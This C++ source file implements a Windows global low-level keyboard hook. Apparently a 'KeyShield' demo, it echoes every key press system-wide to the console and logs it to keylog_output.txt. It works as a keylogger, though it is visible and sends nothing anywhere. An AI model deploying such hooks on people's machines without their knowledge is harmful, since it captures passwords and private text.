#include <windows.h>

#include <fstream>
#include <iostream>
#include <locale>
#include <string>

#include "keyboard_hook.h"

namespace {

HHOOK g_keyboardHook = nullptr;
std::ofstream g_logFile;

std::wstring GetExecutableDirectory() {
    wchar_t modulePath[MAX_PATH] = {0};
    DWORD length = GetModuleFileNameW(nullptr, modulePath, MAX_PATH);
    if (length == 0 || length == MAX_PATH) {
        return L"";
    }

    std::wstring path(modulePath, length);
    const size_t pos = path.find_last_of(L"\\/");
    if (pos == std::wstring::npos) {
        return L"";
    }
    return path.substr(0, pos);
}

std::string Utf16ToUtf8(const std::wstring& value) {
    if (value.empty()) {
        return std::string();
    }

    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, value.data(), (int)value.size(), nullptr, 0, nullptr, nullptr);
    if (sizeNeeded == 0) {
        return std::string();
    }

    std::string result(sizeNeeded, '\0');
    WideCharToMultiByte(CP_UTF8, 0, value.data(), (int)value.size(), result.data(), sizeNeeded, nullptr, nullptr);
    return result;
}

std::string GetKeyNameFromVkCode(DWORD vkCode) {
    UINT scanCode = MapVirtualKeyW(vkCode, MAPVK_VK_TO_VSC);
    if (vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
        vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
        vkCode == VK_LMENU || vkCode == VK_RMENU) {
        scanCode |= 0x100;
    }

    wchar_t keyName[128] = {0};
    LONG result = GetKeyNameTextW(scanCode << 16, keyName, ARRAYSIZE(keyName));
    if (result > 0) {
        return Utf16ToUtf8(std::wstring(keyName, result));
    }

    return "VK_" + std::to_string(vkCode);
}

bool OpenLogFile() {
    if (g_logFile.is_open()) {
        return true;
    }

    std::wstring directory = GetExecutableDirectory();
    if (directory.empty()) {
        std::cerr << "Failed to locate executable directory for log file." << std::endl;
        return false;
    }

    std::wstring logPath = directory + L"\\keylog_output.txt";
    g_logFile.open(logPath, std::ios::app | std::ios::out);
    if (!g_logFile.is_open()) {
        std::wcerr << L"Failed to open log file: " << logPath << std::endl;
        return false;
    }

    g_logFile << "=== KeyShield hook session started ===\n";
    g_logFile.flush();
    return true;
}

void CloseLogFile() {
    if (!g_logFile.is_open()) {
        return;
    }
    g_logFile << "=== KeyShield hook session ended ===\n";
    g_logFile.close();
}

void LogKey(DWORD vkCode) {
    if (!OpenLogFile()) {
        return;
    }

    std::string keyName = GetKeyNameFromVkCode(vkCode);
    if (keyName.empty()) {
        keyName = "VK_" + std::to_string(vkCode);
    }
    g_logFile << keyName << "\n";
    g_logFile.flush();
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        const auto* keyInfo = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        std::cout << "VK: " << keyInfo->vkCode << std::endl;
        LogKey(keyInfo->vkCode);
    }

    return CallNextHookEx(g_keyboardHook, nCode, wParam, lParam);
}

}  // namespace

int RunKeyboardHookDemo() {
    g_keyboardHook = SetWindowsHookExW(
        WH_KEYBOARD_LL,
        LowLevelKeyboardProc,
        GetModuleHandleW(nullptr),
        0);

    if (g_keyboardHook == nullptr) {
        std::cerr << "Failed to install low-level keyboard hook. Error: "
                  << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "Global keyboard hook installed." << std::endl;
    std::cout << "Press Ctrl+C in this console to stop." << std::endl;
    std::cout << "Press any key in Windows to see its virtual-key code and write it to keylog_output.txt." << std::endl;

    MSG msg;
    BOOL result;
    while ((result = GetMessageW(&msg, nullptr, 0, 0)) > 0) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    CloseLogFile();
    UnhookWindowsHookEx(g_keyboardHook);
    if (result == -1) {
        std::cerr << "Message loop failed. Error: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
